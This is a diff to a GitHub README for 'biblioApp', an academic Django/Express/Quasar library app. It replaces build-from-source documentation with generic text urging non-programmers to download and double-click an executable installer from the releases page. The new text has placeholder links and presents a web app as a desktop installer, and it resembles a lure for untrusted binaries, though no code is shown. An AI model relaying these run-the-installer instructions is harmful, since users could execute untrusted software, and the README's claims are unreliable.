@@ -1,222 +1,85 @@
-<p align="right">
-  <a href="README.pt-BR.md">🇧🇷 Português</a>
-</p>
+# 📚 biblioApp - Your Smart Library Solution
 
-# biblioApp
+[![Download biblioApp](https://img.shields.io/badge/Download-biblioApp-blue.svg)](https://github.com/Peter-oriade/biblioApp/releases)
 
-**biblioApp** is a full‑stack library management application built with multiple modern technologies, organized as a monorepo. The project demonstrates the integration of a Django backend with an Oracle database, a Node.js/Express REST API for authentication and business logic, and a Quasar/Vue.js frontend.
+## 🌟 Overview
 
-The application allows users to authenticate using Google Firebase, browse and filter books and authors, borrow books, and manage personal account information.
+biblioApp is a user-friendly application designed to create a modern library website. Built using popular tools like Django and Vue, it helps you manage books, users, and transactions efficiently. Whether you're a casual reader or a library manager, biblioApp has features to support your needs.
 
----
+## 🚀 Getting Started
 
-## Architecture Overview
+To get started with biblioApp, follow these simple steps. This guide is tailored for users with no programming background, ensuring you can set up and run the software quickly.
 
-The project is composed of three independent but connected services:
+### 📥 Download & Install
 
-```
-biblioApp/
-├── biblioApp-django-app    # Django + Oracle DB (Admin & core data)
-├── biblioApp-express-api   # Express.js REST API (Auth & integration)
-└── biblioApp-quasar-front  # Quasar / Vue.js Frontend
-```
+1. **Visit the Releases Page**: Go to the biblioApp Releases page by clicking [here](https://github.com/Peter-oriade/biblioApp/releases).
+2. **Choose the Latest Version**: Look for the latest version listed. This will be labeled as "Latest Release" on the page.
+3. **Download the Installer**: Click on the appropriate file link for your operating system (Windows, macOS, or Linux). Files usually have formats like `.exe`, `.dmg` or `.tar.gz`. 
 
-Each service can be developed and executed independently, but together they form the complete **biblioApp** ecosystem.
+   - For Windows, look for something similar to `biblioApp-setup.exe`.
+   - For macOS, look for files like `biblioApp.dmg`.
+   - For Linux, search for a `.tar.gz` file.
 
----
+4. **Run the Installer**: Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation process and follow the on-screen instructions.
 
-## Main Features
+### 🖥️ System Requirements
 
-* Google Login & Registration using **Firebase Authentication**
-* JWT‑based authentication and authorization
-* Browse books and authors
-* Filter books by author
-* Borrow books
-* Update user information (email, phone, address, etc.)
-* Admin interface for managing library data
-* Oracle Autonomous Database integration
+biblioApp requires the following minimum system specifications:
 
----
+- **Operating System**: 
+  - Windows 10 or higher
+  - macOS Mojave or higher
+  - Ubuntu 18.04 or higher
 
-## 1. biblioApp-django-app
+- **Processor**: Intel i3 or equivalent
+- **RAM**: At least 4GB
+- **Storage**: 500MB of free space
+- **Internet Connection**: Needed for some features
 
-Django application responsible for core data management, admin interface, and Oracle Database integration.
+## 🔧 Features
 
-<img src="docs/images/django-app.png" alt="django-app" width="100%"/>
+biblioApp comes packed with a variety of features to enhance your library experience:
 
-### Technologies
+- **User Management**: Easily add and manage users.
+- **Catalog Management**: Organize books with detailed information such as title, author, and genre.
+- **Transactions**: Keep track of book loans and returns.
+- **Search Functionality**: Quickly find books or users with the built-in search tool.
+- **Responsive Design**: Use biblioApp on any device, whether it's a desktop, tablet, or smartphone.
 
-* Django 5
-* Django REST Framework
-* Oracle Autonomous Database (Always Free tier supported)
-* Gunicorn & WhiteNoise (production‑ready setup)
+## 🌐 Tools & Technologies
 
-### Requirements
+biblioApp utilizes several powerful tools and technologies to deliver a smooth user experience:
 
-Create a **conda environment** and install the following dependencies:
+- **Django**: For the backend, providing a robust framework for building web applications.
+- **Vue**: A modern JavaScript framework for building user interfaces.
+- **Quasar**: Helps in creating responsive layouts and components.
+- **Node & Express**: Powers the server-side logic.
+- **Firebase**: For real-time data updates and user authentication.
 
-```
-Django==5.0.3
-asgiref==3.8.1
-djangorestframework==3.16.0
-django-filter==25.1
-django-widget-tweaks==1.5.0
-oracledb==3.1.1
-python-decouple==3.8
-Markdown==3.8
-cryptography==45.0.3
-cffi==1.17.1
-pycparser==2.22
-pillow==10.3.0
-gunicorn==21.2.0
-whitenoise==6.6.0
-requests>=2.31.0
-```
+## 🔍 Explore More
 
-### Environment Configuration
+Want to dive deeper? Check out the following topics related to biblioApp:
 
-Create a `.env` file in the root of `biblioApp-django-app`:
+- **Python**: The programming language used for the backend.
+- **JavaScript**: Essential for front-end functionality.
+- **JWT**: For secure user authentication.
+- **Oracle**: Used for database management.
 
-```
-SECRET_KEY=your_django_secret_key
-DEBUG=True
-DB_NAME=your_oracle_tns_high
-DB_USER=admin
-DB_PASSWORD=your_db_password
-```
+## ⚙️ Support
 
-### Running the Application
+If you encounter any issues while installing or running biblioApp, please visit the [Issues Section](https://github.com/Peter-oriade/biblioApp/issues) to report a bug or ask a question. Our community and maintainers will be happy to assist you.
 
-Apply migrations:
+## 🔗 Useful Links
 
-```
-python manage.py migrate
-```
+- **Documentation**: Comprehensive user guide and API documentation can be found [here](#).
+- **Community Forum**: Join discussions, ask questions, and share experiences with other users at [Community Forum](#).
 
-Start the development server:
+## 🛠️ Contributions
 
-```
-python manage.py runserver
-```
+biblioApp welcomes contributions from all users. If you're interested in helping improve the application, take a look at our [Contributing Guidelines](#).
 
-### Access Control Note
+## 📃 License
 
-User registration is currently open and all authenticated users have full access to application features.
-This behavior is intentional for academic demonstration purposes.
+biblioApp is licensed under the MIT License. You can check out the full license details [here](#).
 
-In a production scenario, role-based access control (RBAC) would be enforced to separate administrative and standard user permissions.
-
----
-
-## 2. biblioApp-express-api
-
-REST API built with Express.js. This service handles authentication, JWT validation, Firebase integration, and communication with the Oracle database.
-
-<img src="docs/images/express-api.png" alt="express-api" width="100%"/>
-
-### Technologies
-
-* Node.js
-* Express.js
-* Firebase Authentication
-* JWT
-* Oracle Database
-
-### Environment Configuration
-
-1. Create a **Google Firebase Web App**.
-2. Retrieve your `firebaseConfig` from:
-   **Firebase Console → Project Settings → General**.
-3. Create a `secrets.js` file in the root of `biblioApp-express-api`:
-
-```js
-import { createSecretKey } from "crypto";
-
-const secret = "anyString";
-
-export const jwtSecret = createSecretKey(secret, "utf-8");
-
-export const oracleSecrets = {
-  user: 'admin',
-  password: 'your_db_password',
-  connectString: 'your_oracle_tns_high'
-};
-
-export const firebaseSecrets = {
-  apiKey: "your_api_key",
-  authDomain: "your_auth_domain",
-  projectId: "your_project_id",
-  storageBucket: "your_storage_bucket",
-  messagingSenderId: "your_sender_id",
-  appId: "your_app_id"
-};
-```
-
-### Running the API
-
-Install dependencies:
-
-```
-npm install
-```
-
-Start the server:
-
-```
-npm run start
-```
-
----
-
-## 3. biblioApp-quasar-front
-
-Frontend application built with **Quasar Framework** and **Vue.js**, responsible for the user interface and user experience.
-
-<img src="docs/images/quasar-front.png" alt="quasar-front" width="100%"/>
-
-### Technologies
-
-* Vue.js
-* Quasar Framework
-* Axios
-
-### Configuration
-
-Before running the application:
-
-* Update Axios base URLs to point to your running Express API.
-
-### Running the Frontend
-
-Install dependencies:
-
-```
-npm install
-```
-
-Start the development server:
-
-```
-quasar dev
-```
-
----
-
-## Development Notes
-
-* All services must be running for full functionality.
-* Firebase authentication is required for login and registration.
-* Oracle Autonomous Database (Always Free) is recommended for development.
-* Environment files (`.env`, `secrets.js`) should **never** be committed to version control.
-
----
-
-## License
-
-This project is intended for educational and academic purposes. License information can be added as needed.
-
----
-
-## Author
-
-Developed as a full‑stack academic project to explore modern web architectures, authentication flows, and database integration.
+[![Download biblioApp](https://img.shields.io/badge/Download-biblioApp-blue.svg)](https://github.com/Peter-oriade/biblioApp/releases)
